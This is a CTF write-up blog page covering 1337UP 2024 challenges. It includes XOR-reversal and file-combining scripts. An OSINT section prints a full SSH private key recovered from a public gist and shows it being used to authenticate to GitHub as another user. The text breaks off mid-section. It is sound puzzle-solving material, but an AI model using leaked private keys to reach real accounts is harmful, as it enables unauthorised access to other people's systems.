@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title> - TheSaucese&#39;s Blog</title><meta name="Description" content="$ sudo apt install pwntools"><meta property="og:url" content="https://thesaucese.github.io/1337up-2024-full-writeup/">
+  <meta property="og:site_name" content="TheSaucese&#39;s Blog">
+  <meta property="og:title" content="TheSaucese&#39;s Blog">
+  <meta property="og:description" content="1337UP 2024 - Full Writeup Intro Amazing CTF, beginner friendly and is barely guessy, I wish I had more time to solve more challenges, it was super fun. This writeup contains all the challenges that I solved, Crypto, Misc, Osint, Rev and Web.
+Schrödinger’s Pad - Crypto Description Everyone knows you can’t reuse a OTP, but throw in a cat and a box.. Maybe it’s secure?
+nc pad.ctf.intigriti.io 1348
+Explanation When analyzing the code you’ll find out that the flag gets XOR’d with some key, then a bunch of bit operations happen to it depending on the state of our cat.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="og:image" content="https://thesaucese.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://thesaucese.github.io/logo.png">
+  <meta name="twitter:title" content="TheSaucese&#39;s Blog">
+  <meta name="twitter:description" content="1337UP 2024 - Full Writeup Intro Amazing CTF, beginner friendly and is barely guessy, I wish I had more time to solve more challenges, it was super fun. This writeup contains all the challenges that I solved, Crypto, Misc, Osint, Rev and Web.
+Schrödinger’s Pad - Crypto Description Everyone knows you can’t reuse a OTP, but throw in a cat and a box.. Maybe it’s secure?
+nc pad.ctf.intigriti.io 1348
+Explanation When analyzing the code you’ll find out that the flag gets XOR’d with some key, then a bunch of bit operations happen to it depending on the state of our cat.">
+<meta name="application-name" content="Blogs">
+<meta name="apple-mobile-web-app-title" content="Blogs"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thesaucese.github.io/1337up-2024-full-writeup/" /><link rel="next" href="https://thesaucese.github.io/chainit/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thesaucese.github.io\/1337up-2024-full-writeup\/"
+        },"genre": "posts","wordcount":  2660 ,
+        "url": "https:\/\/thesaucese.github.io\/1337up-2024-full-writeup\/","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "TheSaucese"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="TheSaucese&#39;s Blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/aboutme/"> About Me </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="TheSaucese&#39;s Blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/aboutme/" title="">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX"></h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://TheSaucese.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>TheSaucese</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2660 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#schrödingers-pad---crypto">Schrödinger&rsquo;s Pad - Crypto</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#explanation">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#in-plain-sight---misc">In Plain Sight - Misc</a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#explanation-1">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#irrorversible---misc">IrrORversible - Misc</a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#explanation-2">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#layers---misc">Layers - Misc</a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#explanation-3">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#lost-program---misc">Lost Program - Misc</a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#explanation-4">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#quick-recovery---misc">Quick Recovery - Misc</a>
+      <ul>
+        <li><a href="#description-5">Description</a></li>
+        <li><a href="#explanation-5">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#triage-bot-v2---misc">Triage Bot v2 - Misc</a>
+      <ul>
+        <li><a href="#description-6">Description</a></li>
+        <li><a href="#explanation-6">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#no-comment---osint">No Comment - Osint</a>
+      <ul>
+        <li><a href="#description-7">Description</a></li>
+        <li><a href="#explanation-7">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#private-github-repository---osint">Private Github Repository - Osint</a>
+      <ul>
+        <li><a href="#description-8">Description</a></li>
+        <li><a href="#explanation-8">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#socials---osint">Socials - Osint</a>
+      <ul>
+        <li><a href="#description-9">Description</a></li>
+        <li><a href="#explanation-9">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#bug-squash-part-1---rev">Bug Squash (Part 1) - Rev</a>
+      <ul>
+        <li><a href="#description-10">Description</a></li>
+        <li><a href="#explanation-10">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#cold-storage---rev">Cold Storage - Rev</a>
+      <ul>
+        <li><a href="#description-11">Description</a></li>
+        <li><a href="#explanation-11">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#phish-market-order-management---rev">Phish Market Order Management - Rev</a>
+      <ul>
+        <li><a href="#description-12">Description</a></li>
+        <li><a href="#explanation-12">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#rigged-slot-machine-1---rev">Rigged Slot Machine 1 - Rev</a>
+      <ul>
+        <li><a href="#description-13">Description</a></li>
+        <li><a href="#explanation-13">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#secure-bank---rev">Secure Bank - Rev</a>
+      <ul>
+        <li><a href="#description-14">Description</a></li>
+        <li><a href="#explanation-14">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#triforce-recon---rev">TriForce Recon - Rev</a>
+      <ul>
+        <li><a href="#description-15">Description</a></li>
+        <li><a href="#explanation-15">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#pizza-paradise---web">Pizza Paradise - Web</a>
+      <ul>
+        <li><a href="#description-16">Description</a></li>
+        <li><a href="#explanation-16">Explanation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="1337up-2024---full-writeup">1337UP 2024 - Full Writeup</h1>
+<h2 id="intro">Intro</h2>
+<p>Amazing CTF, beginner friendly and is barely guessy, I wish I had more time to solve more challenges, it was super fun.
+This writeup contains all the challenges that I solved, Crypto, Misc, Osint, Rev and Web.</p>
+<h2 id="schrödingers-pad---crypto">Schrödinger&rsquo;s Pad - Crypto</h2>
+<h3 id="description">Description</h3>
+<p>Everyone knows you can&rsquo;t reuse a OTP, but throw in a cat and a box.. Maybe it&rsquo;s secure?</p>
+<p>nc pad.ctf.intigriti.io 1348</p>
+<h3 id="explanation">Explanation</h3>
+<p>When analyzing the code you&rsquo;ll find out that the flag gets XOR&rsquo;d with some key, then a bunch of bit operations happen to it depending on the state of our cat.</p>
+<p>Nonetheless, we can reverse all these operations :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import random
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def reverse_cat_box(ciphertext, cat_state):
+</span></span><span class="line"><span class="cl">    c = bytearray(ciphertext)
+</span></span><span class="line"><span class="cl">    if cat_state == 1:
+</span></span><span class="line"><span class="cl">        for i in range(len(c)):
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">            c[i] ^= 0xAC
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            c[i] = ((c[i] &gt;&gt; 1) | ((c[i] &amp; 0x01) &lt;&lt; 7)) &amp; 0xFF
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        for i in range(len(c)):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            c[i] ^= 0xCA
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            c[i] = ((c[i] &lt;&lt; 1) | (c[i] &gt;&gt; 7)) &amp; 0xFF
+</span></span><span class="line"><span class="cl">    return bytes(c)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def reverse_received_data(c_ciphertext_hex, cat_state):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    c_ciphertext = bytes.fromhex(c_ciphertext_hex)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    original_ciphertext = reverse_cat_box(c_ciphertext, cat_state)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    print(original_ciphertext.hex())
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">c_ciphertext_hex = &#34;be4ca8a482b2f2a08a44c482acc8f0dea046c4e6cab6b2c88c48b89cf4a4f4b644ba5c46fcdcf8b2dca4e29a48a2ce4ac8a48adef440ace6a4fcec80bec6fc84b6a04ce886b6c85ec0f080da869c46b6be9cbc5e808ef6ce44b08688869c888cdaccfc46b2f0a8dea4defe8044e8de88f8c88e8ebcc0f0e0fcb8c0be48daca46bcc4c44c82f48c5ec4a688a25cc0e28088f4b08aa6f8c0a44248c4f2b2ec8a46&#34;  
+</span></span><span class="line"><span class="cl">cat_state = 1  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">reverse_received_data(c_ciphertext_hex, cat_state)
+</span></span></code></pre></div><p>I entered a bunch of A&rsquo;s (160 A&rsquo;s to be exact) so as to extract the key cause it&rsquo;s a XOR, then I took the flag the program spat out, reversed it and XOR&rsquo;d it with the key I found.</p>
+<h2 id="in-plain-sight---misc">In Plain Sight - Misc</h2>
+<h3 id="description-1">Description</h3>
+<p>Barely hidden tbh..</p>
+<h3 id="explanation-1">Explanation</h3>
+<p>Aperisolve spoiled the password for us, I extracted the hidden zip using foremost, then used the password, then got a png file in which the flag was hidden&hellip;in plain sight (superimposed)</p>
+<h2 id="irrorversible---misc">IrrORversible - Misc</h2>
+<h3 id="description-2">Description</h3>
+<p>So reversible it&rsquo;s practically irreversible</p>
+<h3 id="explanation-2">Explanation</h3>
+<p>This one is Fairly simple but guessy, at first I tried to execute cat flag but then I tried just inputting a lots of As, then xored the result with the input and got the flag.</p>
+<h2 id="layers---misc">Layers - Misc</h2>
+<h3 id="description-3">Description</h3>
+<p>Weird way to encode your data, but OK! 🤷‍♂️</p>
+<h3 id="explanation-3">Explanation</h3>
+<p>the files should be sorted based on their modified date :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">append_text_from_files_by_date</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># List all files in the folder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">folder_path</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">folder_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">folder_path</span><span class="p">,</span> <span class="n">f</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Sort files by last modified time</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getmtime</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Combine the text from the files</span>
+</span></span><span class="line"><span class="cl">    <span class="n">combined_text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">file_path</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">combined_text</span> <span class="o">+=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Warning: Could not read file </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s2">. Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">combined_text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">folder_path</span> <span class="o">=</span> <span class="s2">&#34;./layers/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">combined_text</span> <span class="o">=</span> <span class="n">append_text_from_files_by_date</span><span class="p">(</span><span class="n">folder_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Save combined text to a new file</span>
+</span></span><span class="line"><span class="cl"><span class="n">output_file_path</span> <span class="o">=</span> <span class="s1">&#39;./combined_output.txt&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file_path</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">output_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">combined_text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Combined text has been saved to &#39;</span><span class="si">{</span><span class="n">output_file_path</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="lost-program---misc">Lost Program - Misc</h2>
+<h3 id="description-4">Description</h3>
+<p>I was working on a bug bounty program the other day but I completely forgot the name!! I guess that will teach me not to use emoji notation in future 😩 Anyway, if you could help me find it again, I&rsquo;d really appreciate it! Here&rsquo;s my notes..</p>
+<p>TODO: find lots of 😎🐛 on 🥷🥝🎮</p>
+<p>Hint: flag format = INTIGRITI{company_name}</p>
+<h3 id="explanation-4">Explanation</h3>
+<p>Ninja_Kiwi was the company name. ChatGPT solved this.</p>
+<h2 id="quick-recovery---misc">Quick Recovery - Misc</h2>
+<h3 id="description-5">Description</h3>
+<p>Hey, check this QR code ASAP! It&rsquo;s highly sensitive so I scrambled it, but you shouldn&rsquo;t have a hard time reconstructing - just make sure to update the a_order to our shared PIN. The b_order is the reverse of that 😉</p>
+<h3 id="explanation-5">Explanation</h3>
+<p>I didn&rsquo;t even read the code, just used photoshop to piece the puzzle together. This one is a piece of cake</p>
+<h2 id="triage-bot-v2---misc">Triage Bot v2 - Misc</h2>
+<h3 id="description-6">Description</h3>
+<p>Check out our new and improved Triage Bot!</p>
+<p><a href="https://go.intigriti.com/discord" target="_blank" rel="noopener noreffer ">https://go.intigriti.com/discord</a></p>
+<h3 id="explanation-6">Explanation</h3>
+<p>Same challenge as last year, this time you invite the bot to your server then you assign yourself a triage role, after that you&rsquo;ll call !read_report 0 and you&rsquo;ll get your flag.</p>
+<h2 id="no-comment---osint">No Comment - Osint</h2>
+<h3 id="description-7">Description</h3>
+<p>Or is there? 🤔</p>
+<h3 id="explanation-7">Explanation</h3>
+<p>The usual, string the file, get the strings, first string is part of an imgur link (guessy), whose title is a base64 text, which leads us to a pastebin url and gives us its password, this pastebin contains a hex, this hex looks like it has been XOR&rsquo;d, I reuse the same password and I get the flag, and now I&rsquo;m interested in this cool event, what a psychedelic dream !</p>
+<h2 id="private-github-repository---osint">Private Github Repository - Osint</h2>
+<h3 id="description-8">Description</h3>
+<p>Bob Robizillo created a public instructions for Tiffany, so she can start work on new secret project. can you access the secret repository?</p>
+<h3 id="explanation-8">Explanation</h3>
+<p>This is a github/Osint challenge, to solve it I looked up &ldquo;Bob Robizillo&rdquo; on google, found a gist github link, the file email.md contained a base64 encoded zip file that when unzipped gave us the id_rsa file :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class="line"><span class="cl">NhAAAAAwEAAQAAAYEA2VMBgH/+tCMWx0KvI93adov6hAIH/7TPBG7Gz9bzRobMO8DsG1IK
+</span></span><span class="line"><span class="cl">3T0ZdsmtFEMmBUYQFCbIVZzgHKOQ4RriXwsYB6CCTjCDY3fkfsV52FlIVbpYGDGtzagD4R
+</span></span><span class="line"><span class="cl">+sve0VX21sOV0Q/5tLGanamXl4e1Fmc53JLnsed56AkQpsjXJ/3hdvHwntaCv7f5oD76rz
+</span></span><span class="line"><span class="cl">VtB29On2qCfpTkBQ0t4quLlXstQIZiMoNTPKHYivAC96/eg6I/iROxqXSEX1B6bZa1F0Vx
+</span></span><span class="line"><span class="cl">ilQruDUxV3XKMhiLmheSW8xbjG+qjkftR62QXZl16TrzmcSvzLebRyPDVcPcHJwL5dE6t5
+</span></span><span class="line"><span class="cl">pFaEGAHjSIVm4Im8fvQ8kSWOVZTTnNQvBqXtrwKJhs4RWjAbE2CuxtvuPPBaB5oyWEjpzv
+</span></span><span class="line"><span class="cl">zaW5PuWseb1/BEiC9TWiQyei8rAZLSP3YS1w1l8bw4KIqYCBvbaooE+W5+EPj7+zmOaROd
+</span></span><span class="line"><span class="cl">TvmTluHpuQV+P+MOn2qVwUdWjdRPG2Zi0RmKZO/TAAAFgERaWudEWlrnAAAAB3NzaC1yc2
+</span></span><span class="line"><span class="cl">EAAAGBANlTAYB//rQjFsdCryPd2naL+oQCB/+0zwRuxs/W80aGzDvA7BtSCt09GXbJrRRD
+</span></span><span class="line"><span class="cl">JgVGEBQmyFWc4ByjkOEa4l8LGAeggk4wg2N35H7FedhZSFW6WBgxrc2oA+EfrL3tFV9tbD
+</span></span><span class="line"><span class="cl">ldEP+bSxmp2pl5eHtRZnOdyS57HneegJEKbI1yf94Xbx8J7Wgr+3+aA++q81bQdvTp9qgn
+</span></span><span class="line"><span class="cl">6U5AUNLeKri5V7LUCGYjKDUzyh2IrwAvev3oOiP4kTsal0hF9Qem2WtRdFcYpUK7g1MVd1
+</span></span><span class="line"><span class="cl">yjIYi5oXklvMW4xvqo5H7UetkF2Zdek685nEr8y3m0cjw1XD3BycC+XROreaRWhBgB40iF
+</span></span><span class="line"><span class="cl">ZuCJvH70PJEljlWU05zULwal7a8CiYbOEVowGxNgrsbb7jzwWgeaMlhI6c782luT7lrHm9
+</span></span><span class="line"><span class="cl">fwRIgvU1okMnovKwGS0j92EtcNZfG8OCiKmAgb22qKBPlufhD4+/s5jmkTnU75k5bh6bkF
+</span></span><span class="line"><span class="cl">fj/jDp9qlcFHVo3UTxtmYtEZimTv0wAAAAMBAAEAAAGAJU48acSPAnkrhdUKn4uL3uG0hU
+</span></span><span class="line"><span class="cl">ib+uccylQByNfLNwYYtQEvBpmUx9mfL2b7UQkd07XtOKhXp2qghgoF6r5ksZAD9fs1oxps
+</span></span><span class="line"><span class="cl">03xXOvPHML5SznSIfs64WR9IWzLGwmuaSaFM/KPfMSGFSMiBf+r8JZ8ZiStCx7nWxw3sX/
+</span></span><span class="line"><span class="cl">l8HOPU01kOeDOKD2HNcGAN4OxljTeH1A79imwffpFHzorYppEaXtZLAs1yL3/OaDd4Yv3D
+</span></span><span class="line"><span class="cl">jSZ6JIac15p+8acgosmfI+8JTwnW09s8lGmpiVLKGEnxZA9Q+TeQPfo58iiEy5ndxtyKe2
+</span></span><span class="line"><span class="cl">BKkSUjfmqvCH8V/z769QphzZ6GhoAefoAGb3GMNwsnjVsvhgNtYTptuhgJfL1iRt2PtLaC
+</span></span><span class="line"><span class="cl">sFC/H4gzHj3WmCWj0AqhCuEygPxTIVA2fx/4uA4VCL6CkNQ/U+IIXjZsNlTTw+vC6Fmk9N
+</span></span><span class="line"><span class="cl">s7e1wrZ7GF2QSTL4T52t0oEO101aLtGJvq95cBOqBOJ1q90GuiEYeNdUZ8G3bW4FKhAAAA
+</span></span><span class="line"><span class="cl">wGuEkWmDYQ81u7GnUZaMfvHu5SxpksSv9LL5JZvZHerm/20KzjhoRHc2oW6nQZ5r5Ipvoa
+</span></span><span class="line"><span class="cl">YXhCx+pWMnxkXjtt16RCBX/Ii7RvMDlN6rgbfq8pdmftgDfeSBII0NG+EY/s4uWWW2JVlr
+</span></span><span class="line"><span class="cl">b08dj7MkZG72PXXVrUNSNNIWZBFrlLLN6UeD071BfPTv4fWTBs/3tf68n0SPsXsr7NbBJx
+</span></span><span class="line"><span class="cl">jce3nNlYuGkap01SrUQlF72hm9IjtpoEdNEpiQ81x9MefYCAAAAMEA8SztbVCnTSi35hOA
+</span></span><span class="line"><span class="cl">Gsd106kDCahYIkBG5E1PVausBQrCruVXWo6Az23VehNrjJFqV88dxMYrzXqgW9kHQ1anUo
+</span></span><span class="line"><span class="cl">ZSJEhj6+FYuN1Jgjmm7xzhC38N3YkLcXuojiDxkUSbkChFPj+JkEA/63c/XRZ6WOmo0A5K
+</span></span><span class="line"><span class="cl">be3bOMzMJ/Cu1yhqxCZ0f2uOYUBMG3VFIu5Wg5RYIujYmcEUDZIoT7FkmEUJOfg3Q82PlX
+</span></span><span class="line"><span class="cl">Y3yk8GpGkEJeHcx3ZFseSGIueiDwQJAAAAwQDmrsLwzy+SxG/02lOq+zkhm6mhlNp0ZmYz
+</span></span><span class="line"><span class="cl">s6X9uzIKH712UxEY2WS5DPd3C87Fh06kb2nD3ozu++qCLwD7HSw55j1dA80pj+89qM/NN2
+</span></span><span class="line"><span class="cl">0zkdAgCqJfYcSqLw+Tl8D2fzqdw0BdfCisizX5iK4U5t9+yfOjD8rtm/yQtCUuIdoyLGIG
+</span></span><span class="line"><span class="cl">vxiCtsZX3ZpET3nE2AEbIjALCH52pqDaHpHGCrarrkVeVEPlSJvG8fhe4PkD3ETCAJynyu
+</span></span><span class="line"><span class="cl">B6k0LmSeJY4/sAAAAGMTMzN3VwAQIDBAU=
+</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>At first I thought it&rsquo;s something to do with SSH and I had to guess the hostname (assuming the username is tiffany)&hellip;No. After I added the key to my ssh list I got this :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh-add id_rsa
+</span></span><span class="line"><span class="cl">Identity added: id_rsa <span class="o">(</span>1337up<span class="o">)</span>
+</span></span><span class="line"><span class="cl">$ ssh -T git@github.com
+</span></span><span class="line"><span class="cl">Hi nitrofany! You<span class="err">&#39;</span>ve successfully authenticated, but GitHub does not provide shell access.
+</span></span></code></pre></div><p>Now I am nitrofany, I can access my own repos :</p>
